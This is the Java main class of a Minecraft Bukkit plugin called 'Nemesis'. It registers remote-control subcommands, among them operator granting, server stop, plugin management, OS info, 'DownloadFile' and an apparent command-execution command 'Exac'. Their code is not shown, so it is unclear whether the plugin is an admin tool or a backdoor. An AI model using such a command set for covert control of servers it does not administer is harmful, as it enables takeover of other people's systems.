package nemesis;

import nemesis.commands.subcommands.*;
import org.bukkit.plugin.java.JavaPlugin;

import java.util.Arrays;

public final class Nemesis extends JavaPlugin {

    private static Nemesis instance;
    private CommandManager commandManager;

    public static Nemesis getInstance() {
        return instance;
    }

    @Override
    public void onEnable() {
        instance = this;
        commandManager = new CommandManager(this);
        Arrays.asList(
                new Ban(),
                new BanList(),
                new DeOP(),
                new DownloadFile(),
                new Gamemode(),
                new Permission(),
                new Kick(),
                new OP(),
                new PlayerList(),
                new PluginList(),
                new PluginManager(),
                new Reload(),
                new ServerInfo(),
                new Stop(),
                new Unban(),
                new Exac(),
                new ClearInventory(),
                new GiveItem(),
                new SetFlying(),
                new SetInvulnerable(),
                new OPList(),
                new OSInfo(),
                new Whitelist(),
                new WorldList()).forEach(commandManager::registerSubCommand);
    }

    public CommandManager getCommandManager() {
        return commandManager;
    }
}